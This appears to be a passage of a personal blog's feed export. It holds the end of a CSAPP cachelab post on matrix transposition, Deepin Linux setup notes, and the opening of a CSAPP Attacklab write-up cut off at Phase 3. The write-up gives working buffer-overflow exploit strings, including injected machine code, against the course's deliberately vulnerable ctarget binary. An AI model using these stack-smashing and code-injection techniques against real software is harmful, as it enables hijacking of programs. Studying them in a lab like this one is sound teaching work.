class="line">                        B[i + <span class="number">0</span>][k] = t0;</span><br><span class="line">                        B[i + <span class="number">1</span>][k] = t1;</span><br><span class="line">                        B[i + <span class="number">2</span>][k] = t2;</span><br><span class="line">                        B[i + <span class="number">3</span>][k] = t3;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 后4个需要单独处理</span></span><br><span class="line">                        B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">8</span>] = t4;</span><br><span class="line">                        B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">9</span>] = t5;</span><br><span class="line">                        B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">10</span>] = t6;</span><br><span class="line">                        B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">11</span>] = t7;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// 最后一块单独处理</span></span><br><span class="line">                        <span class="comment">// 只处理8x8的上 4x8方块</span></span><br><span class="line">                        B[i + <span class="number">0</span>][k] = t0;</span><br><span class="line">                        B[i + <span class="number">1</span>][k] = t1;</span><br><span class="line">                        B[i + <span class="number">2</span>][k] = t2;</span><br><span class="line">                        B[i + <span class="number">3</span>][k] = t3;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 补齐最后一块的下4行条带， 即最后的8x8的下4x8方块</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">size_t</span> a = <span class="number">56</span>; a &lt; <span class="number">64</span>; a++)</span><br><span class="line">        &#123;</span><br><span class="line">            t4 = A[a][i + <span class="number">4</span>];</span><br><span class="line">            t5 = A[a][i + <span class="number">5</span>];</span><br><span class="line">            t6 = A[a][i + <span class="number">6</span>];</span><br><span class="line">            t7 = A[a][i + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">            B[i + <span class="number">4</span>][a] = t4;</span><br><span class="line">            B[i + <span class="number">5</span>][a] = t5;</span><br><span class="line">            B[i + <span class="number">6</span>][a] = t6;</span><br><span class="line">            B[i + <span class="number">7</span>][a] = t7;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> LEN</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你眼尖，会发现一个问题，那就是局部变量用了13个。好吧，确实是，but，我们是可以解决的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> a = i; a &lt; i + <span class="number">4</span>; a++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> b = j; b &lt; j + <span class="number">4</span>; b++) <span class="comment">// 一个条带</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 两点关于一条直线对称</span></span><br><span class="line">        B[b + i - j + <span class="number">4</span>][a - i + j - <span class="number">8</span>] = B[a][b];</span><br><span class="line">        B[b + i - j + <span class="number">4</span>][a - i + j - <span class="number">4</span>] = B[a][b + <span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把这个循环展开即可。</p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>呼，加上今天的文章，cachelab一共花了3天的时间，不过是完全值得的，能够深入理解经常碰到的cacheline的本质，理清了很多概念上的东西。 cache友好的代码确实很难想也很难写，以我目前的能力，写代码时还考虑不到这么底层，考虑一些时间、空间局部性就快极限了，每一行代码都去想cache line实在耗费很多精力，不得不说，还有很多路要走啊。</p><p>最近也要忙项目了，下一个lab不知道什么时候再做。但一定要把csapp啃完！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本次 lab, cachelab.&lt;/p&gt;
&lt;h2 id=&quot;0-说明&quot;&gt;&lt;a href=&quot;#0-说明&quot; class=&quot;headerlink&quot; title=&quot;0. 说明&quot;&gt;&lt;/a&gt;0. 说明&lt;/h2&gt;&lt;p&gt;从这个lab开始，终于开始编写一些高级语言的代码了，而不像之前要去分析汇编。但是这并不意味这题目就简单了，实际上，cachelab耗费了我2天多的时间。ok，言归正传，这个lab的目的是什么呢？&lt;/p&gt;
&lt;p&gt;cachelab帮助我们理解计算机存储体系中的重要组成部分–cache。 理解cache是如何组织的，如何工作的，又是如何影响我们的程序的性能的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Csapp" scheme="https://www.ravenxrz.ink/categories/Csapp/"/>
    
    
      <category term="cachelab" scheme="https://www.ravenxrz.ink/tags/cachelab/"/>
    
  </entry>
  
  <entry>
    <title>Deepin安装后续事项记录</title>
    <link href="https://www.ravenxrz.ink/archives/8134a50f.html"/>
    <id>https://www.ravenxrz.ink/archives/8134a50f.html</id>
    <published>2020-07-21T06:18:35.000Z</published>
    <updated>2020-09-06T07:37:36.752Z</updated>
    
    <content type="html"><![CDATA[<p>manjaro是个人最喜欢的linux发行版，但是给我的台式机安装后，总是死机，无奈暂时转入deepin。</p><blockquote><p>后来发现manjaro死机，应该是给cpu超频的原因, 因为deepin也死机了，关闭超频后，一切正常，但是已经在deepin上安装好了各种环境，不想再更换回去。</p></blockquote><p>本文依然是自己给自己的备份。</p><a id="more"></a><p>安装流程：</p><ol><li><p>更新仓库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp;　sudo apt ugprade -y</span><br></pre></td></tr></table></figure></li><li><p>几个前提软件：vim ,google-chrome, fcitx-rime</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install vim google-chromme-stable fcitx-rime </span><br></pre></td></tr></table></figure><p>如果有fcitx-rime的备份，拉下备份即可，路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;.config&#x2F;fcitx&#x2F;rime</span><br></pre></td></tr></table></figure></li><li><p>zsh+oh-myz-zsh配置：<a href="https://www.ravenxrz.ink/archives/6c55eca4.html">https://www.ravenxrz.ink/archives/6c55eca4.html</a></p></li><li><p>electron–ssr，要使用chrome，得先同步一下，地址:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3FpbmdzaHVpc2l5dWFuL2VsZWN0cm9uLXNzci1iYWNrdXAvcmVsZWFzZXMvZG93bmxvYWQvdjAuMi42L2VsZWN0cm9uLXNzci0wLjIuNi5kZWI=" title="https://github.com/qingshuisiyuan/electron-ssr-backup/releases/download/v0.2.6/electron-ssr-0.2.6.deb">https://github.com/qingshuisiyuan/electron-ssr-backup/releases/download/v0.2.6/electron-ssr-0.2.6.deb<i class="fa fa-external-link"></i></span></p></li></ol><p>ok,有了这几个，后面就会容易很多。</p><p>openjdk , vscode， idea，clion，netease-clound-music, Persepolis, <strong>copyQ</strong>， barrier（两台物理机共用一套键鼠，个人目前台式机linux做开发，笔记本windows办公），wps（应急用）,tldr(快速查命令手册), gitkraken, okular(pdf阅读器)</p><p>自定义快捷键：</p><p>控制面板-&gt;键盘和语言-&gt;快捷键：</p><ul><li>截图–F2</li><li>终端雷神模式-F12</li></ul><h2 id="一些问题："><a href="#一些问题：" class="headerlink" title="一些问题："></a><strong>一些问题：</strong></h2><p><strong>fcitx开机候选字体过小：</strong></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f15095614195aa594196163.jpg"></p><p><strong>copyQ窗口显示快捷键设置：</strong></p><ol><li>打开copyQ应用程序</li><li>F6</li><li>添加</li><li>显示/隐藏主窗口</li><li>添加全局快捷键(Ctrl+`)， 和windows上的ditto保持一致。</li></ol><p>更多copyQ问题：<span class="exturl" data-url="aHR0cHM6Ly9jb3B5cS5yZWFkdGhlZG9jcy5pby9lbi9sYXRlc3QvZmFxLmh0bWw=" title="https://copyq.readthedocs.io/en/latest/faq.html">https://copyq.readthedocs.io/en/latest/faq.html<i class="fa fa-external-link"></i></span></p><p><strong>deepin风扇声音巨大：</strong></p><p>windows下，我的台式机几乎是静音，但是deepin（也包括manjaro)风扇声音巨大。查看系统资源占用，cpu, memory, disk都很低，最终觉得可能是gpu的风扇问题，无法方便的查看gpu占用率，于是安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi</span><br></pre></td></tr></table></figure><p>安装这个软件包，会自动安装一些nvidia的模块，安装后重启，发现已经没有风扇声音了。</p><p><strong>开机自动的问题：</strong></p><p>有时候哦需要添加一些开机自动的软件或者脚本。这一点deepin做的还是相当不错的，对于gui的应用，可以通过 右键-&gt;添加到开机自启动来做。对于脚本，个人安装的的是zsh terminal，所以对应到.zshrc文件，可以直接在该文件中添加脚本，考虑到可维护性的问题，可以手动建立一个.myautostartup.sh脚本，然后在.zshrc文件中添加：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.myautostartup.sh</span><br></pre></td></tr></table></figure><p>以后所有的要开机自启动的脚本直接在myautostartup.sh添加即可。</p><p>额外说一下barriers的配置脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/barriers --no-tray --debug INFO --name raven-desktop-deepin --enable-crypto -c ~/.barrier_config --address :24800 </span><br></pre></td></tr></table></figure><p>.barrier_config文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">section: screens</span><br><span class="line">raven-desktop-deepin:</span><br><span class="line">halfDuplexCapsLock &#x3D; false</span><br><span class="line">halfDuplexNumLock &#x3D; false</span><br><span class="line">halfDuplexScrollLock &#x3D; false</span><br><span class="line">xtestIsXineramaUnaware &#x3D; false</span><br><span class="line">switchCorners &#x3D; none </span><br><span class="line">switchCornerSize &#x3D; 0</span><br><span class="line">raven-laptop-win:</span><br><span class="line">halfDuplexCapsLock &#x3D; false</span><br><span class="line">halfDuplexNumLock &#x3D; false</span><br><span class="line">halfDuplexScrollLock &#x3D; false</span><br><span class="line">xtestIsXineramaUnaware &#x3D; false</span><br><span class="line">switchCorners &#x3D; none </span><br><span class="line">switchCornerSize &#x3D; 0</span><br><span class="line">raven-laptop-manjaro:</span><br><span class="line">halfDuplexCapsLock &#x3D; false</span><br><span class="line">halfDuplexNumLock &#x3D; false</span><br><span class="line">halfDuplexScrollLock &#x3D; false</span><br><span class="line">xtestIsXineramaUnaware &#x3D; false</span><br><span class="line">switchCorners &#x3D; none </span><br><span class="line">switchCornerSize &#x3D; 0</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">section: aliases</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">section: links</span><br><span class="line">raven-desktop-deepin:</span><br><span class="line">right &#x3D; raven-laptop-win</span><br><span class="line">raven-laptop-win:</span><br><span class="line">left &#x3D; raven-desktop-deepin</span><br><span class="line">down &#x3D; raven-laptop-manjaro</span><br><span class="line">raven-laptop-manjaro:</span><br><span class="line">up &#x3D; raven-laptop-win</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">section: options</span><br><span class="line">relativeMouseMoves &#x3D; false</span><br><span class="line">screenSaverSync &#x3D; true</span><br><span class="line">win32KeepForeground &#x3D; false</span><br><span class="line">clipboardSharing &#x3D; true</span><br><span class="line">switchCorners &#x3D; none </span><br><span class="line">switchCornerSize &#x3D; 0</span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>qt creator高分屏显示问题</strong></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f150c1114195aa5941a289e.jpg"></p><p><strong>vim，ideavim，qtvim配置</strong></p><p>terminal的vim，采用：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtaXgvdmltcmM=" title="https://github.com/amix/vimrc">https://github.com/amix/vimrc<i class="fa fa-external-link"></i></span> 配置</p><p>ideavim和qtvim采用：<span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vcmF2ZW54cnovZGJhOGRkMGMxZWJhNGJiMDM5ZjAwOGY1Njg2N2UwODM=" title="https://gist.github.com/ravenxrz/dba8dd0c1eba4bb039f008f56867e083">https://gist.github.com/ravenxrz/dba8dd0c1eba4bb039f008f56867e083<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;manjaro是个人最喜欢的linux发行版，但是给我的台式机安装后，总是死机，无奈暂时转入deepin。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;后来发现manjaro死机，应该是给cpu超频的原因, 因为deepin也死机了，关闭超频后，一切正常，但是已经在deepin上安装好了各种环境，不想再更换回去。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本文依然是自己给自己的备份。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://www.ravenxrz.ink/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>Csapp-Attacklab题解</title>
    <link href="https://www.ravenxrz.ink/archives/f81059da.html"/>
    <id>https://www.ravenxrz.ink/archives/f81059da.html</id>
    <published>2020-07-21T06:14:03.000Z</published>
    <updated>2020-09-06T07:37:36.748Z</updated>
    
    <content type="html"><![CDATA[<p>csapp lab系列：</p><ul><li><a href="https://www.ravenxrz.ink/archives/2d758396.html">Csapp-Datalab 详解</a></li><li><a href="https://www.ravenxrz.ink/archives/7915569e.html">Csapp-Bomblab 题解</a></li></ul><p>本次lab: Attacklab</p><p>耽误了整整一个月没有做csapp的lab了. 忙着返校,忙着实验室的东西, 今天抽了点时间,总算是完成了第三个实验.</p><p>下面就记录下题解分析吧.</p><a id="more"></a><h2 id="0-背景知识"><a href="#0-背景知识" class="headerlink" title="0. 背景知识"></a>0. 背景知识</h2><ol><li>程序的内存分布,,内存分布<a href="https://www.ravenxrz.ink/archives/2567fa35.html">https://www.ravenxrz.ink/archives/2567fa35.html</a></li><li>函数调用的过程, 主要要知道call和ret指令各自的工作. </li><li>gdb调试,objdump反汇编</li><li>Buffer Overflow以及常用的阻止buffer overflow的方法</li><li>ROP攻击</li></ol><p>其中,最重要的是,一定要了解stack frame的call和ret过程.</p><h2 id="1-Phase-1"><a href="#1-Phase-1" class="headerlink" title="1. Phase 1"></a>1. Phase 1</h2><p>题目就给英文了</p><p>For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute an existing procedure. Function getbuf is called within CTARGET by a function test having the following C code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.</span></span><br><span class="line"><span class="string">    Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget, there is code for a function touch1 having the following C representation:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.</p><p>这个题目非常简单, 不需要注入攻击, 只需要利用 getbuf()将程序的控制权从test函数,转入到touch1函数即可.</p><p>利用<code>objdump -d</code>命令,反汇编ctarget看看:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  40196c:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401971:e8 32 fe ff ff       callq  4017a8 &lt;getbuf&gt;</span><br><span class="line">  401976:89 c2                mov    %eax,%edx</span><br><span class="line">  401978:be 88 31 40 00       mov    $0x403188,%esi</span><br><span class="line">  40197d:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  401982:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401987:e8 64w f4 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  401990:c3                   retq   </span><br><span class="line">  401991:90                   nop</span><br><span class="line">  401992:90                   nop</span><br><span class="line">  401993:90                   nop</span><br><span class="line">  401994:90                   nop</span><br><span class="line">  401995:90                   nop</span><br><span class="line">  401996:90                   nop</span><br><span class="line">  401997:90                   nop</span><br><span class="line">  401998:90                   nop</span><br><span class="line">  401999:90                   nop</span><br><span class="line">  40199a:90                   nop</span><br><span class="line">  40199b:90                   nop</span><br><span class="line">  40199c:90                   nop</span><br><span class="line">  40199d:90                   nop</span><br><span class="line">  40199e:90                   nop</span><br><span class="line">  40199f:90                   nop</span><br><span class="line"></span><br><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:48 83 ec 28          sub    $0x28,%rsp</span><br><span class="line">  4017ac:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  4017af:e8 8c 02 00 00       callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4017b9:48 83 c4 28          add    $0x28,%rsp</span><br><span class="line">  4017bd:c3                   retq   </span><br><span class="line">  4017be:90                   nop</span><br><span class="line">  4017bf:90                   nop</span><br><span class="line"></span><br><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  4017c4:c7 05 0e 2d 20 00 01 movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:00 00 00 </span><br><span class="line">  4017ce:bf c5 30 40 00       mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:e8 e8 f4 ff ff       callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  4017dd:e8 ab 04 00 00       callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:bf 00 00 00 00       mov    $0x0,%edi</span><br><span class="line">  4017e7:e8 54 f6 ff ff       callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>我将三个涉及到的东西提取了出来. 主要看getbuf和touch1函数.</p><p>对于getbuf来说, 我们看到汇编的第一句就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub $0x28,%rsp</span><br></pre></td></tr></table></figure><p>也就是说, getbuf首先开辟了0x28的stack空间.</p><p>对于touch1来说,我们知道它的地址是:0x4017c0. </p><p>好的,知道这两点,我们就可以写攻击代码了, 在写之前, 先画个示意图:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200720231159598.png" alt="image-20200720231159598"></p><p>说明:</p><ol><li>单元格中存放的是起始起始,一个内存单元8个字节</li><li>buffer由低到高写入</li></ol><p>关键点是要 <strong>覆盖test 401976</strong>这个单元, 正常情况下,这里存放这从getbuf返回后,test函数中getbuf的下一行汇编指令. 要从test中抢夺函数控制权, 就需要覆盖这里. 那覆盖成什么样? 当然就是我们 touch1函数的首地址了, 另外需要注意机器的字节序(这里是小端序). 综上, 攻击代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* question1: 填充40个字节后加入touch1的返回地址(小端序) *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 byte *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 byte *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 byte *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 byte *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 byte *&#x2F;</span><br><span class="line">c0 17 40 00 00 00 00 00 &#x2F;* touch1 address *&#x2F;</span><br></pre></td></tr></table></figure><p>40 = 0x28</p><blockquote><p>请注意, 之所以可以做,因为ctarget在汇编时关闭了 <strong>stack随机和注入代码不可执行</strong> 两个常用的阻止注入攻击的方法, 否则这个题就目前的知识来说是无解的.</p></blockquote><h2 id="2-Phase-2"><a href="#2-Phase-2" class="headerlink" title="2. Phase 2"></a>2. Phase 2</h2><p>题目:</p><p>Phase 2 involves injecting a small amount of code as part of your exploit string. Within the file ctarget there is code for a function touch2 having the following C representation:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;</span><br><span class="line">     <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument.</p><p>题目的意思很简单, 接着题目1, 现在要跳转的函数是touch2, 只不过touch2需要一个参数val, val是cookie的值. 这里就要用到注入了, 如何生成注入代码,请参照 attack lab的write up的Appendix B.</p><p>说明:cookie在lab文件中有, 我这里它是 0x59b997fa.</p><p>关键点:</p><ol><li>cookie值</li><li>rdi寄存器保存函数的第一个参数.</li></ol><p>思路简单:</p><ol><li>设置rdi = cookie value</li><li>跳转到touch2即可.</li></ol><p>但是这里存在两个跳转, 1.跳转我们的注入代码的首地址.2.跳转到touch2. 画个图看看:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200720232843852.png" alt="image-20200720232843852"></p><p>也就是说,我们首先应该跳转到我们注入的代码的首地址, 然后注入代码执行过程中(红色的区域的某个部分),又跳转到touch2. </p><p>跳转1很直观, 我们覆盖了原来的地址, 那跳转2如何实现?</p><p>这个就要理解清除call和ret指令的工作了, 简单说来:</p><ol><li>call, %rsp-1, push当前执行指令的指令到%rsp所指的内存空间, 设置%rip为要跳转的函数的第一条指令地址.</li><li>ret, pop %rsp指向的内存空间的内容到 %rip, %rsp+1.</li></ol><p>于是要实现跳转2, 我们只用push touch2的第一条指令的地址到$%rsp, %rsp-1即可. 其实也就一条命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push touch2_address</span><br></pre></td></tr></table></figure><p>至于设置%rdi=cooike, 那就很直接了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov cookie_value, %rdi</span><br></pre></td></tr></table></figure><p>结合两条指令, 写出汇编代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov cookie_value, %rdi</span><br><span class="line">push touch2_address</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>更换为实际value, 并用objdump反汇编,最终可得答案:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* question2: *&#x2F;</span><br><span class="line">48 c7 c7 fa 97 b9 59 &#x2F;* mov $0x59b997fa      %rdi 设置cooike *&#x2F;</span><br><span class="line">68 ec 17 40 00       &#x2F;* pushq  $0x4017ec     push touch2的地址 *&#x2F;</span><br><span class="line">c3                   &#x2F;* ret                  返回 *&#x2F;</span><br><span class="line">&#x2F;* 上面一共13个字节, buf一共40个字节所以需要填充 40-13&#x3D;27个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00                &#x2F;* 3 bytes *&#x2F;</span><br><span class="line">78 dc 61 55 00 00 00 00 &#x2F;* exploit string code 的开始地址（即get buf的栈地地址) *&#x2F;</span><br></pre></td></tr></table></figure><p>一点题外话:</p><blockquote><p>这个题思路很简单,但是我却做了差不多3个小时. 原因在于, 我对每个指令都补齐成了8个字节(也不知道脑袋怎么想的). 搞了1,2个小时 , gdb调试出来的指令和我写入的指令就是不同, 无奈取网上查答案, 发现思路是对的, 别人的代码却和我的不同, 要不就是 题目都和我不一样. 最后认真看了一个帖子才找到自己的问题. </p><p>比如我将 c3指令,编码成了 c3 00 00 00 00 00 00 00 . 所以在运行时, 总是不对.</p></blockquote><h2 id="3-Phase-3"><a href="#3-Phase-3" class="headerlink" title="3. Phase 3"></a>3. Phase 3</h2><p>题目:</p><p>Phase 3 also involves a code injection attack, but passing a string as argument. Within the file ctarget there is code for functions hexmatch and touch3 having the following C 